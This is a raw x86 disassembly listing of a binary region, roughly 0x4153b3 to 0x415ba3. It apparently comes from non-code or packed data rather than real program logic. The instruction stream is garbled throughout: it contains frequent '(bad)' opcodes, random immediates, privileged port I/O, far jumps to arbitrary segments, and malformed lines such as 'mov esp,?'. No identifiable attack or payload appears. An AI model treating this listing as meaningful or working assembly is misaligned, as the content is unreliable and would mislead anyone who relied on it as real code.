  4153b3:	pop    ebx
  4153b4:	out    dx,al
  4153b5:	add    al,0xda
  4153b7:	xchg   BYTE PTR [edx],dh
  4153b9:	loop   0x41541e
  4153bb:	mov    BYTE PTR [edx],0x84
  4153be:	jnp    0x41537d
  4153c0:	mov    ecx,0xf99b96f3
  4153c5:	mov    ah,0x5b
  4153c7:	dec    esi
  4153c8:	inc    eax
  4153c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ca:	dec    ecx
  4153cb:	daa    
  4153cc:	push   edx
  4153cd:	sbb    al,0xf0
  4153cf:	stc    
  4153d0:	cs int3 
  4153d2:	pushf  
  4153d3:	and    al,0x15
  4153d5:	clc    
  4153d6:	mov    ds:0xa2c89067,al
  4153db:	gs jno 0x415419
  4153de:	fisubr DWORD PTR [edi]
  4153e0:	adc    ebp,edx
  4153e2:	jae    0x41538d
  4153e4:	ret    0xfc35
  4153e7:	fbld   TBYTE PTR [esi+0x1a6987e3]
  4153ed:	or     BYTE PTR [ebx],0x1d
  4153f0:	mov    bh,0xd0
  4153f2:	adc    edi,DWORD PTR [ecx-0x30]
  4153f5:	ror    DWORD PTR [edx],1
  4153f7:	sbb    BYTE PTR [ebp-0x65],ah
  4153fa:	je     0x415410
  4153fc:	(bad)  
  4153fd:	mov    esi,0x8073bfd2
  415402:	pop    ebp
  415403:	paddusb mm2,QWORD PTR [ebp-0x1dcd9305]
  41540a:	add    DWORD PTR [edx-0x1a],esp
  41540d:	call   0xb259c2ea
  415412:	add    al,0xf4
  415414:	es mov ch,0x3b
  415417:	pop    edi
  415418:	test   al,0xeb
  41541a:	jl     0x415412
  41541c:	es hlt 
  41541e:	mov    DWORD PTR [esi],esi
  415420:	fnstsw WORD PTR [edx+0x39]
  415423:	adc    edx,edx
  415425:	pop    ecx
  415426:	push   ds
  415427:	loopne 0x415456
  415429:	push   0x16
  41542b:	cmp    BYTE PTR [esi+0x4d73004],ch
  415431:	cdq    
  415432:	pop    eax
  415433:	sub    eax,0xc23e612d
  415438:	adc    BYTE PTR [ecx],bl
  41543a:	cmp    al,bl
  41543c:	sub    DWORD PTR [edi],0x3dc15a2e
  415442:	rol    DWORD PTR [eax+0x5a0ff854],0x3
  415449:	pop    ebp
  41544a:	dec    BYTE PTR [ebp+0x8b50879]
  415450:	test   BYTE PTR [ebx-0x2eff0f85],al
  415456:	inc    edx
  415457:	in     eax,0xe3
  415459:	mov    dl,0xe8
  41545b:	ret    
  41545c:	dec    edx
  41545d:	sbb    DWORD PTR [ebx+edx*8-0x30],0x4
  415462:	cs or  al,0xc5
  415465:	pop    ebp
  415466:	push   ss
  415467:	rol    ecx,0x5
  41546a:	repz aaa 
  41546c:	cmp    eax,0x7941ecf9
  415471:	fist   WORD PTR [eax-0x2d8b15cf]
  415477:	mov    al,0x95
  415479:	adc    eax,0xed08e7ce
  41547e:	ins    DWORD PTR es:[edi],dx
  41547f:	xchg   ebp,eax
  415480:	or     eax,0x4de67036
  415485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415486:	sub    eax,0x90a4449b
  41548b:	cmc    
  41548c:	es add al,0x6c
  41548f:	inc    edi
  415490:	and    DWORD PTR [ebx+ebp*1-0x12d36945],esp
  415497:	cwde   
  415498:	dec    ebp
  415499:	mov    ecx,0xa83af650
  41549e:	push   esp
  41549f:	jge    0x415480
  4154a1:	lea    ecx,[ebp-0x413dc50e]
  4154a7:	mov    bh,BYTE PTR [eax]
  4154a9:	sub    BYTE PTR [ecx],dl
  4154ab:	inc    edx
  4154ac:	fild   DWORD PTR [ebx-0x1]
  4154af:	rcl    BYTE PTR [ebp+0xc],1
  4154b2:	pusha  
  4154b3:	sti    
  4154b4:	inc    edx
  4154b5:	aas    
  4154b6:	mov    bh,0x73
  4154b8:	mov    WORD PTR [ecx],ss
  4154ba:	mov    eax,0xdf832540
  4154bf:	ret    
  4154c0:	push   0x87a2be37
  4154c5:	in     al,0xe0
  4154c7:	stos   DWORD PTR es:[edi],eax
  4154c8:	out    0xe8,eax
  4154ca:	ss arpl WORD PTR ds:0x849a2295,sp
  4154d2:	xor    BYTE PTR [edi-0x29f50b5b],dl
  4154d8:	paddb  mm4,QWORD PTR [edx+0x7889c595]
  4154df:	xchg   edi,eax
  4154e0:	test   ah,ch
  4154e2:	rcl    DWORD PTR [ebp+0x47dee1c6],0xa8
  4154e9:	dec    edi
  4154ea:	mov    dh,0x4e
  4154ec:	std    
  4154ed:	imul   ebx,ebx,0x6e
  4154f0:	outs   dx,DWORD PTR ds:[esi]
  4154f1:	and    al,0xf6
  4154f3:	lods   al,BYTE PTR ds:[esi]
  4154f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154f5:	std    
  4154f6:	sbb    dh,BYTE PTR [ecx]
  4154f8:	scas   al,BYTE PTR es:[edi]
  4154f9:	dec    esp
  4154fa:	lahf   
  4154fb:	mov    dl,0xe7
  4154fd:	mov    ecx,0xbeac3409
  415502:	push   cs
  415503:	jecxz  0x4154a4
  415505:	cmc    
  415506:	mov    eax,0xc6efa66e
  41550b:	fst    DWORD PTR [esi+0x2e8fa152]
  415511:	loope  0x415565
  415513:	sbb    eax,ecx
  415515:	jge    0x41556e
  415517:	fwait
  415518:	mov    dl,0x8d
  41551a:	in     eax,dx
  41551b:	adc    al,0xd8
  41551d:	imul   cx,WORD PTR [esi+0x655fa5cf],0xffed
  415525:	dec    esp
  415526:	scas   al,BYTE PTR es:[edi]
  415527:	call   0x538f:0xc61a4fec
  41552e:	jno    0x4154b0
  415530:	(bad)  
  415531:	in     eax,0x59
  415533:	jecxz  0x415569
  415535:	adc    DWORD PTR [ebp-0x6d74a64f],0xffffff89
  41553c:	aas    
  41553d:	out    dx,al
  41553e:	sbb    edi,eax
  415540:	inc    edi
  415541:	or     dl,BYTE PTR [di]
  415544:	les    ebp,FWORD PTR [esi-0x4d4a8184]
  41554a:	ja     0x4154eb
  41554c:	nop
  41554d:	pusha  
  41554e:	cmp    eax,0x5b0b01c2
  415553:	ins    DWORD PTR es:[edi],dx
  415554:	xchg   ecx,eax
  415555:	push   ds
  415556:	xchg   ebp,eax
  415557:	pop    edx
  415558:	mov    bh,0x4e
  41555a:	and    dh,0xe9
  41555d:	push   ebp
  41555e:	or     al,0xd7
  415560:	out    dx,al
  415561:	cmc    
  415562:	xor    DWORD PTR ds:0xc628fece,esi
  415568:	retf   0xb14c
  41556b:	scas   eax,DWORD PTR es:[edi]
  41556c:	cmp    DWORD PTR [edx-0x45],edi
  41556f:	push   eax
  415570:	jmp    0x461c6acc
  415575:	(bad)  
  415576:	jne    0x41558b
  415578:	retf   0xf725
  41557b:	stos   BYTE PTR es:[edi],al
  41557c:	in     al,dx
  41557d:	lock data16 fcom DWORD PTR [eax-0x3f]
  415582:	mov    edi,0xcd25413b
  415587:	ficom  WORD PTR [ecx+0x5a]
  41558a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41558b:	repz inc edx
  41558d:	jns    0x415607
  41558f:	stos   DWORD PTR es:[edi],eax
  415590:	(bad)  
  415591:	sub    eax,0xdfa5b616
  415596:	mov    eax,0x18751fb7
  41559b:	mov    al,ds:0xa8e70f8
  4155a0:	pop    ebp
  4155a1:	mov    bh,0xa8
  4155a3:	cld    
  4155a4:	fisubr DWORD PTR [ebp-0x7f]
  4155a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155a8:	mov    al,ds:0xee94e86d
  4155ad:	jl     0x4155b5
  4155af:	sbb    eax,0x8206c64
  4155b4:	sbb    DWORD PTR [ecx+0x39a0fc98],0x6b
  4155bb:	sub    dh,BYTE PTR [ecx+0x2b23cb98]
  4155c1:	(bad)  
  4155c2:	sbb    al,0x5d
  4155c4:	and    eax,0xbebb1
  4155c9:	mov    bh,0x4
  4155cb:	pop    ebx
  4155cc:	adc    bh,BYTE PTR [ebp+0x33]
  4155cf:	adc    al,0x45
  4155d1:	sub    al,BYTE PTR [eax-0xf4bb4d1]
  4155d7:	mov    edi,0xc021b8a4
  4155dc:	inc    edx
  4155dd:	adc    ebx,DWORD PTR [ebp-0x4fc12172]
  4155e3:	pop    esi
  4155e4:	mov    dl,BYTE PTR [esi-0x11d4559d]
  4155ea:	push   esi
  4155eb:	jno    0x415586
  4155ed:	xchg   DWORD PTR [edx-0x6b016d2c],eax
  4155f3:	mov    DWORD PTR [ebx-0x2b495d3b],esi
  4155f9:	cmp    ebp,ebx
  4155fb:	xor    eax,0x5ddd8aa1
  415600:	pop    ebx
  415601:	arpl   dx,cx
  415603:	mov    edi,0x6bbfc8e8
  415608:	sub    eax,0x8a26c6f2
  41560d:	rol    DWORD PTR [eax],cl
  41560f:	mov    dh,0x67
  415611:	sbb    eax,0xd79fdd44
  415616:	mov    ds,WORD PTR [edi+0x536dfbc]
  41561c:	pop    esi
  41561d:	loopne 0x415611
  41561f:	push   ds
  415620:	or     al,0x11
  415622:	stc    
  415623:	xor    cl,0x3a
  415626:	jb     0x41566e
  415628:	xor    DWORD PTR [eax-0x687e5692],eax
  41562e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41562f:	jmp    0xc9ef9e4b
  415634:	xor    esi,DWORD PTR [esi]
  415636:	into   
  415637:	xchg   DWORD PTR [ebx],ebp
  415639:	and    edi,DWORD PTR [esi-0x4c83536e]
  41563f:	pusha  
  415640:	sar    edi,cl
  415642:	or     al,0x33
  415644:	mov    al,0xe1
  415646:	sahf   
  415647:	shr    DWORD PTR [ecx+0x75efb54],cl
  41564d:	cmc    
  41564e:	push   eax
  41564f:	int3   
  415650:	jp     0x4156cc
  415652:	not    ch
  415654:	test   al,0xc7
  415656:	jnp    0x415699
  415658:	inc    ebx
  415659:	and    esi,esp
  41565b:	in     al,dx
  41565c:	sbb    dh,ah
  41565e:	cmp    al,0xd0
  415660:	and    ecx,0xe9a7e600
  415666:	or     DWORD PTR [esi],0x1fc72848
  41566c:	lods   al,BYTE PTR ds:[esi]
  41566d:	jo     0x4156aa
  41566f:	or     BYTE PTR [ebp-0x4c],dl
  415672:	jecxz  0x415693
  415674:	mov    eax,gs:0x18d0fc78
  41567a:	(bad)  
  41567b:	dec    ebx
  41567c:	loop   0x41563c
  41567e:	sub    DWORD PTR [edi],eax
  415680:	scas   eax,DWORD PTR es:[edi]
  415681:	and    BYTE PTR [esi+ebp*8-0x3],0x55
  415686:	rcl    DWORD PTR ds:0x12e871b7,cl
  41568c:	std    
  41568d:	lds    edi,FWORD PTR [eax+0x2b]
  415690:	inc    ecx
  415691:	jg     0x4156a7
  415693:	or     DWORD PTR [ecx],ecx
  415695:	jg     0x4156b0
  415697:	xor    cl,BYTE PTR [edi]
  415699:	outs   dx,DWORD PTR ds:[esi]
  41569a:	or     BYTE PTR [edx+eax*1-0x69c07ae],bl
  4156a1:	mov    WORD PTR [edx-0x52],es
  4156a4:	cmp    bl,BYTE PTR [ebp+0x46]
  4156a7:	adc    eax,0x76fad922
  4156ac:	cmp    BYTE PTR [eax-0x5b],dh
  4156af:	xchg   esp,eax
  4156b0:	xchg   DWORD PTR [esi+eax*1],ebp
  4156b3:	mov    ds:0x4721c136,eax
  4156b8:	pop    esp
  4156b9:	and    al,0xcf
  4156bb:	lea    ebp,[edi+0x6e6e7004]
  4156c1:	leave  
  4156c2:	xchg   BYTE PTR [ecx+esi*1-0x69],ch
  4156c6:	adc    cl,dl
  4156c8:	call   0xa39e:0xff20261b
  4156cf:	lods   eax,DWORD PTR ds:[esi]
  4156d0:	nop
  4156d1:	(bad)  
  4156d2:	cmp    eax,0xa4499d79
  4156d7:	in     al,dx
  4156d8:	push   edi
  4156d9:	sahf   
  4156da:	or     esi,ebx
  4156dc:	or     DWORD PTR [eax+0x3132122a],eax
  4156e2:	push   ecx
  4156e3:	pop    ebp
  4156e4:	outs   dx,DWORD PTR ds:[esi]
  4156e5:	mov    BYTE PTR [ebp-0x67],0x5c
  4156e9:	or     edx,DWORD PTR [ebp+0x13796fef]
  4156ef:	(bad)  
  4156f0:	lea    ebp,[esi]
  4156f2:	icebp  
  4156f3:	sub    al,0xc0
  4156f5:	lods   eax,DWORD PTR ds:[esi]
  4156f6:	cli    
  4156f7:	loop   0x41570c
  4156f9:	lods   al,BYTE PTR ds:[esi]
  4156fa:	mov    dh,0xf3
  4156fc:	or     ebp,ebx
  4156fe:	scas   eax,DWORD PTR es:[edi]
  4156ff:	push   esp
  415700:	adc    eax,0xaed24239
  415705:	out    0xf5,al
  415707:	in     al,dx
  415708:	or     eax,0x4ccac285
  41570d:	push   0xffffffa8
  41570f:	clc    
  415710:	div    BYTE PTR [ecx-0x15]
  415713:	xor    BYTE PTR [ecx-0xacc51d],cl
  415719:	jnp    0x41575c
  41571b:	(bad)  
  41571c:	rol    DWORD PTR [ebp-0x5f],cl
  41571f:	inc    edi
  415720:	add    DWORD PTR [eax],0xffffff92
  415723:	out    0xc5,al
  415725:	out    0xae,al
  415727:	hlt    
  415728:	les    esp,FWORD PTR [ecx]
  41572a:	nop
  41572b:	inc    eax
  41572c:	es xchg esp,eax
  41572e:	sbb    eax,0x4c1807ad
  415733:	pop    ds
  415734:	adc    ch,BYTE PTR [ebx+0x5d]
  415737:	xchg   edx,eax
  415738:	mov    al,ds:0xbb70832b
  41573d:	jbe    0x415740
  41573f:	dec    edx
  415740:	nop
  415741:	in     eax,dx
  415742:	sub    al,BYTE PTR [esi]
  415744:	xchg   ebx,eax
  415745:	xchg   ecx,eax
  415746:	in     eax,0xaf
  415748:	loop   0x41575e
  41574a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41574b:	mov    edi,DWORD PTR [ebx+0x2e406e27]
  415751:	xchg   edi,eax
  415752:	or     dh,ah
  415754:	jle    0x4157bf
  415756:	int3   
  415757:	xchg   esi,eax
  415758:	sbb    BYTE PTR [ecx+esi*2],0x8c
  41575c:	jbe    0x41576c
  41575e:	popa   
  41575f:	fld    QWORD PTR [edi+0x1a98b203]
  415765:	test   BYTE PTR [edi+0x4d],bl
  415768:	(bad)  
  415769:	popa   
  41576a:	outs   dx,BYTE PTR ds:[esi]
  41576b:	dec    ebx
  41576c:	xor    ch,bl
  41576e:	fsubr  st,st(3)
  415770:	call   0x393e5693
  415775:	in     al,0xab
  415777:	mov    edx,0xa2534219
  41577c:	pop    ebx
  41577d:	out    0x44,eax
  41577f:	pop    ecx
  415780:	sbb    BYTE PTR [eax],ah
  415782:	inc    ebx
  415783:	push   es
  415784:	js     0x415709
  415786:	std    
  415787:	int    0xb9
  415789:	or     BYTE PTR [edi-0x75],al
  41578c:	daa    
  41578d:	(bad)  
  41578e:	clc    
  41578f:	dec    edi
  415790:	adc    al,0x2d
  415792:	pop    eax
  415793:	push   cs
  415794:	mov    esp,?
  415796:	xor    DWORD PTR [edi+0x4998dcb9],edx
  41579c:	mov    ch,0xae
  41579e:	mov    dh,0x5f
  4157a0:	xor    BYTE PTR [ebx-0x13],al
  4157a3:	aaa    
  4157a4:	cli    
  4157a5:	mov    BYTE PTR ds:0x2a783af5,bl
  4157ab:	fstp   QWORD PTR [eax-0x3da35e19]
  4157b1:	sbb    edx,0x3e873e54
  4157b7:	(bad)  
  4157b8:	in     al,0x60
  4157ba:	mov    bl,0xd5
  4157bc:	and    BYTE PTR [esi],0xbd
  4157bf:	dec    ebx
  4157c0:	mov    ebx,DWORD PTR [edx+ebp*2+0x3d]
  4157c4:	aad    0xb0
  4157c6:	and    eax,DWORD PTR [esi-0x64]
  4157c9:	in     al,0xa9
  4157cb:	push   cs
  4157cc:	inc    edx
  4157cd:	clc    
  4157ce:	push   es
  4157cf:	ficomp WORD PTR [edx-0x7]
  4157d2:	adc    DWORD PTR [esi+edx*1+0x28],esp
  4157d6:	mov    al,ds:0x3ad02105
  4157db:	in     al,0xac
  4157dd:	or     ebp,DWORD PTR ds:0xd5c1bc88
  4157e3:	cmp    DWORD PTR [ebp-0x623a8789],eax
  4157e9:	ins    DWORD PTR es:[edi],dx
  4157ea:	outs   dx,DWORD PTR ds:[esi]
  4157eb:	sbb    bl,cl
  4157ed:	leave  
  4157ee:	xor    dh,bh
  4157f0:	jb     0x41582a
  4157f2:	ds xchg edi,eax
  4157f4:	ja     0x41579c
  4157f6:	inc    eax
  4157f7:	and    dl,BYTE PTR [ecx-0x37]
  4157fa:	dec    esi
  4157fb:	dec    eax
  4157fc:	xchg   ebp,eax
  4157fd:	xor    eax,0x1fdd1132
  415802:	outs   dx,BYTE PTR ds:[esi]
  415803:	xlat   BYTE PTR ds:[ebx]
  415804:	mov    eax,0x9e0a11d6
  415809:	call   0x13e4:0xc99f6e52
  415810:	lahf   
  415811:	jnp    0x415847
  415813:	sbb    BYTE PTR ds:0xbff34072,al
  415819:	(bad)  
  41581a:	in     eax,0x1c
  41581c:	outs   dx,BYTE PTR ds:[esi]
  41581d:	jmp    0xd586c6d2
  415822:	icebp  
  415823:	cmp    eax,0xb729cd10
  415828:	pop    esi
  415829:	cmp    ah,BYTE PTR [ebp+0x1313090f]
  41582f:	es jnp 0x41588d
  415832:	into   
  415833:	inc    ebp
  415834:	test   eax,0xe37972a1
  415839:	dec    ebx
  41583a:	mov    edi,0x2a5591fe
  41583f:	jo     0x415848
  415841:	jp     0x41587e
  415843:	ss push cs
  415845:	push   cs
  415846:	sahf   
  415847:	or     BYTE PTR [edi],dl
  415849:	hlt    
  41584a:	call   0x14cb:0xe820e157
  415851:	jne    0x4158cd
  415853:	mov    edx,0x2c19a3a7
  415858:	test   eax,0xd044926
  41585d:	rcl    BYTE PTR [edx+0x4b8a5e46],0x53
  415864:	sub    dh,dh
  415866:	jbe    0x4158a2
  415868:	dec    esp
  415869:	inc    edi
  41586a:	lfs    edi,FWORD PTR [esp+ebx*4+0x0]
  41586f:	jae    0x4158bc
  415871:	neg    DWORD PTR [ebp+ebp*2+0x4]
  415875:	push   edx
  415876:	loop   0x415849
  415878:	mov    bl,BYTE PTR [ebx-0x332ef17d]
  41587e:	arpl   dx,sp
  415880:	mov    ?,WORD PTR [esi+esi*4]
  415883:	adc    eax,0xe07b5c35
  415888:	retf   0x2f20
  41588b:	fwait
  41588c:	cmp    BYTE PTR [ecx+0x8],ch
  41588f:	in     eax,0xd5
  415891:	jae    0x4158ff
  415893:	mov    eax,DWORD PTR [eax+0x3db5da77]
  415899:	sbb    ah,BYTE PTR [eax]
  41589b:	pushf  
  41589c:	and    ecx,DWORD PTR [eax+0x42]
  41589f:	push   eax
  4158a0:	or     DWORD PTR [edx+eax*2-0x77e784ed],ebp
  4158a7:	jle    0x415836
  4158a9:	push   ss
  4158aa:	adc    BYTE PTR [ebp-0x425cc4c0],bl
  4158b0:	pusha  
  4158b1:	or     BYTE PTR [edi-0x10],ah
  4158b4:	and    DWORD PTR [eax],0x4968e397
  4158ba:	add    DWORD PTR [ebx],esp
  4158bc:	int    0xde
  4158be:	jmp    0x415933
  4158c0:	jecxz  0x415843
  4158c2:	sub    eax,0x9a2c5363
  4158c7:	fiadd  WORD PTR [ecx+edx*1+0x51]
  4158cb:	mov    bh,0x92
  4158cd:	push   ebx
  4158ce:	jae    0x4158bc
  4158d0:	push   ebp
  4158d1:	mov    ecx,0xa1b9e153
  4158d6:	(bad)  
  4158d7:	and    edi,DWORD PTR [eax]
  4158d9:	or     DWORD PTR [edi-0x2316abd1],ebp
  4158df:	in     eax,dx
  4158e0:	in     eax,0xe
  4158e2:	inc    ebx
  4158e3:	jo     0x4158ef
  4158e5:	repz sahf 
  4158e7:	dec    ebx
  4158e8:	fstp   QWORD PTR fs:[edi+0x6]
  4158ec:	call   0x8658:0x5dc58a27
  4158f3:	cdq    
  4158f4:	stos   DWORD PTR es:[edi],eax
  4158f5:	addr16 mov al,0x88
  4158f8:	mov    ebx,0xd6e48ad1
  4158fd:	ret    0xe42b
  415900:	add    al,0xf
  415902:	add    eax,0x73c9cb32
  415907:	stc    
  415908:	sahf   
  415909:	lods   eax,DWORD PTR ds:[esi]
  41590a:	(bad)
  41590d:	push   esi
  41590e:	out    0x14,eax
  415910:	mov    esi,0x7b48450e
  415915:	ja     0x415927
  415917:	retf   
  415918:	dec    esi
  415919:	cmp    eax,0x6d2dccf1
  41591e:	fcom   DWORD PTR [ebx-0x6d6042e6]
  415924:	inc    esp
  415925:	xchg   edx,eax
  415926:	sbb    ecx,DWORD PTR [eax]
  415928:	loop   0x4158d8
  41592a:	test   BYTE PTR [esi-0x2bee1991],ah
  415930:	xor    al,BYTE PTR [ebx]
  415932:	test   eax,0xfabc825b
  415937:	or     dl,0xd
  41593a:	or     eax,0x38bca4c9
  41593f:	out    dx,eax
  415940:	xchg   edx,eax
  415941:	sub    DWORD PTR [esp+ebp*1+0x42761d9c],esi
  415948:	mov    BYTE PTR [edx-0x16],cl
  41594b:	cmp    bh,BYTE PTR cs:[edx-0x427020f9]
  415952:	dec    esp
  415953:	or     DWORD PTR [edi-0x78],ebp
  415956:	mov    edi,0x65203f94
  41595b:	pop    ecx
  41595c:	mov    eax,0xdb6bd0d6
  415961:	out    0xa4,al
  415963:	push   ss
  415964:	mov    WORD PTR [ebx],es
  415966:	dec    ebp
  415967:	dec    ebx
  415968:	mov    BYTE PTR [edx],ah
  41596a:	add    eax,0xbb8640d0
  41596f:	call   FWORD PTR [eax-0x22ddbdb7]
  415975:	jne    0x415967
  415977:	in     eax,0x38
  415979:	iret   
  41597a:	jmp    0x4159a6
  41597c:	shl    BYTE PTR [ebx+0x698d3733],1
  415982:	or     edi,ebx
  415984:	popa   
  415985:	icebp  
  415986:	xlat   BYTE PTR ds:[ebx]
  415987:	push   esi
  415988:	and    edi,DWORD PTR [ecx+0x12]
  41598b:	jbe    0x4159d2
  41598d:	repz add BYTE PTR [esi],0x6c
  415991:	bound  esi,QWORD PTR ss:[esi+0x77d3a8d9]
  415998:	pop    edi
  415999:	stos   BYTE PTR es:[edi],al
  41599a:	scas   al,BYTE PTR es:[edi]
  41599b:	mov    bl,0xc7
  41599d:	xor    al,0x1a
  41599f:	lods   al,BYTE PTR ds:[esi]
  4159a0:	out    0x14,al
  4159a2:	cwde   
  4159a3:	in     eax,0xed
  4159a5:	fs in  al,dx
  4159a7:	xor    al,0xb5
  4159a9:	sbb    eax,0x31e36c1b
  4159ae:	jmp    0x1bc7eda1
  4159b3:	push   0xee5d6501
  4159b8:	or     bh,BYTE PTR [edx]
  4159ba:	adc    al,0xad
  4159bc:	push   edi
  4159bd:	xchg   ebp,eax
  4159be:	outs   dx,DWORD PTR ds:[esi]
  4159bf:	push   eax
  4159c0:	xchg   ebp,eax
  4159c1:	pop    ebx
  4159c2:	or     BYTE PTR [edi+ebx*2+0xe],cl
  4159c6:	sub    dh,0xb3
  4159c9:	sbb    eax,0x800840e9
  4159ce:	dec    ecx
  4159cf:	in     eax,dx
  4159d0:	mov    esi,0xbd608e31
  4159d5:	test   DWORD PTR [eax-0x28fff155],ebp
  4159db:	cld    
  4159dc:	mov    al,ds:0x4b256b62
  4159e1:	mov    ah,0xac
  4159e3:	loopne 0x415a15
  4159e5:	xor    al,0xa
  4159e7:	jl     0x41597f
  4159e9:	jmp    0xf33d:0x99f371be
  4159f0:	jmp    0x1fa7:0x5fe2719
  4159f7:	sbb    DWORD PTR [edi],edi
  4159f9:	pop    ebx
  4159fa:	cwde   
  4159fb:	out    dx,al
  4159fc:	adc    ah,BYTE PTR [edx+ebx*4+0x774127e4]
  415a03:	mov    esi,0xd5f8e841
  415a08:	lds    ebp,FWORD PTR [ebx-0x7837570c]
  415a0e:	or     al,0xf5
  415a10:	es cli 
  415a12:	jno    0x4159c9
  415a14:	push   0x8c792fc1
  415a19:	pop    es
  415a1a:	jg     0x4159c8
  415a1c:	cld    
  415a1d:	jle    0x4159cc
  415a1f:	pop    esp
  415a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a21:	mov    ecx,cs
  415a23:	jmp    0x4159bc
  415a25:	and    ebp,DWORD PTR [ebx+eiz*8]
  415a28:	mov    ds:0x7a97e721,al
  415a2d:	ret    
  415a2e:	mov    bh,0x2e
  415a30:	mov    ebp,0xa91b4d00
  415a35:	jge    0x415ab1
  415a37:	adc    DWORD PTR es:[edx-0x2f42dd2c],ebp
  415a3e:	ds add al,0xdc
  415a41:	sar    WORD PTR [edx+0x43],0x3f
  415a46:	stos   DWORD PTR es:[edi],eax
  415a47:	aas    
  415a48:	ins    DWORD PTR es:[edi],dx
  415a49:	leave  
  415a4a:	mov    bl,0xa0
  415a4c:	retf   0xe968
  415a4f:	fwait
  415a50:	out    dx,al
  415a51:	outs   dx,BYTE PTR ds:[esi]
  415a52:	fisubr WORD PTR ds:0x52e9c113
  415a58:	add    esp,DWORD PTR [ebx]
  415a5a:	repz push eax
  415a5c:	mov    BYTE PTR [esi],0x52
  415a5f:	das    
  415a60:	and    al,0x47
  415a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a63:	test   DWORD PTR [ebx-0x4c],ecx
  415a66:	jnp    0x415a97
  415a68:	jge    0x415ac0
  415a6a:	cwde   
  415a6b:	test   DWORD PTR [esi*4-0x535ff5f],esp
  415a72:	mov    eax,ds:0xaf7c3b1e
  415a77:	(bad)  
  415a78:	and    edx,ebp
  415a7a:	mov    BYTE PTR [edi+edi*8+0x72],dh
  415a7e:	leave  
  415a7f:	mov    edx,0x89eee31a
  415a84:	in     eax,0xea
  415a86:	sub    ebx,DWORD PTR [ebx-0x66]
  415a89:	test   DWORD PTR [ebp+ecx*8+0x3757134e],edi
  415a90:	push   ecx
  415a91:	mov    cl,dl
  415a93:	inc    eax
  415a94:	neg    BYTE PTR [eax+0x7d]
  415a97:	in     eax,dx
  415a98:	popf   
  415a99:	bnd ja 0x415a65
  415a9c:	lahf   
  415a9d:	ret    
  415a9e:	xor    dh,BYTE PTR [esi+0x36d7d82b]
  415aa4:	or     BYTE PTR [ecx+0x6c6cc478],0x46
  415aab:	xchg   esi,eax
  415aac:	push   ebp
  415aad:	(bad)  
  415aae:	pop    esi
  415aaf:	sbb    DWORD PTR [edx-0x3a17b217],ebx
  415ab5:	clc    
  415ab6:	mov    ecx,0x6c7e3f15
  415abb:	push   ds
  415abc:	add    esi,DWORD PTR [eax+0x286bc508]
  415ac2:	mov    ah,bl
  415ac4:	push   esp
  415ac5:	jmp    DWORD PTR [edx+esi*1+0x67]
  415ac9:	(bad)  
  415aca:	jmp    0x1d1e:0x88bd3ca4
  415ad1:	xor    al,0x1e
  415ad3:	and    dl,ah
  415ad5:	xchg   BYTE PTR ds:0xa3dbf2f4,bl
  415adb:	pop    edx
  415adc:	mov    ds:0x81cea3c4,eax
  415ae1:	xchg   edi,ebp
  415ae3:	xor    eax,0xff88acb1
  415ae8:	push   ecx
  415ae9:	jg     0x415ae8
  415aeb:	cmp    edx,eax
  415aed:	(bad)  
  415aee:	cmp    al,0xc0
  415af0:	and    BYTE PTR [eax-0x14],bl
  415af3:	adc    al,0xb0
  415af5:	mov    DWORD PTR fs:[ecx-0x45812dbb],ebx
  415afc:	jbe    0x415b4c
  415afe:	icebp  
  415aff:	retf   
  415b00:	ins    BYTE PTR es:[edi],dx
  415b01:	popf   
  415b02:	je     0x415b5d
  415b04:	pop    ecx
  415b05:	xchg   ecx,eax
  415b06:	pop    ebp
  415b07:	jo     0x415b05
  415b09:	fnstenv [edi-0x51]
  415b0c:	std    
  415b0d:	aaa    
  415b0e:	scas   eax,DWORD PTR es:[edi]
  415b0f:	pop    es
  415b10:	ins    DWORD PTR es:[edi],dx
  415b11:	and    BYTE PTR [ecx-0x14b4e54b],dl
  415b17:	mov    al,0x55
  415b19:	stc    
  415b1a:	cli    
  415b1b:	shr    edx,cl
  415b1d:	fadd   st,st(2)
  415b1f:	jns    0x415b75
  415b21:	scas   al,BYTE PTR es:[edi]
  415b22:	ficomp DWORD PTR [edi-0x83bee71]
  415b28:	mov    al,0x58
  415b2a:	jne    0x415b7f
  415b2c:	stos   BYTE PTR es:[edi],al
  415b2d:	ja     0x415b79
  415b2f:	lock mov al,0x7c
  415b32:	dec    esp
  415b33:	out    0x96,al
  415b35:	imul   eax,DWORD PTR [edx],0xb0292264
  415b3b:	push   esi
  415b3c:	or     esi,ecx
  415b3e:	arpl   WORD PTR [esi+ebp*2+0x73353e82],dx
  415b45:	addr16 cdq 
  415b47:	jb     0x415b4b
  415b49:	aad    0xed
  415b4b:	inc    esi
  415b4c:	lock dec ebp
  415b4e:	aas    
  415b4f:	cmp    cl,bh
  415b51:	sbb    al,0x38
  415b53:	(bad)  
  415b54:	(bad)  
  415b55:	lock (bad) 
  415b57:	push   ds
  415b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b59:	in     al,0xdd
  415b5b:	or     eax,0xd6060988
  415b60:	(bad)  
  415b61:	lock out dx,al
  415b63:	popf   
  415b64:	inc    ebp
  415b65:	sub    DWORD PTR [ebp-0x7cca1eb8],0x34
  415b6c:	jne    0x415b5e
  415b6e:	ret    0xb7cd
  415b71:	xor    al,BYTE PTR [ecx]
  415b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b74:	call   0xc36:0xbe462ec6
  415b7b:	sub    ecx,DWORD PTR [esi+esi*8+0x67]
  415b7f:	sbb    bh,cl
  415b81:	inc    esp
  415b82:	(bad)
  415b85:	ss pop esp
  415b87:	mov    esp,0x2ad624c5
  415b8c:	xor    DWORD PTR [edi],ecx
  415b8e:	mov    ds:0xdc5ac725,al
  415b93:	into   
  415b94:	jg     0x415c0d
  415b96:	hlt    
  415b97:	inc    ecx
  415b98:	out    dx,al
  415b99:	inc    ecx
  415b9a:	pop    edx
  415b9b:	in     al,0x9d
  415b9d:	call   0x5d1bf0e7
  415ba2:	iret   
  415ba3:	push   ecx
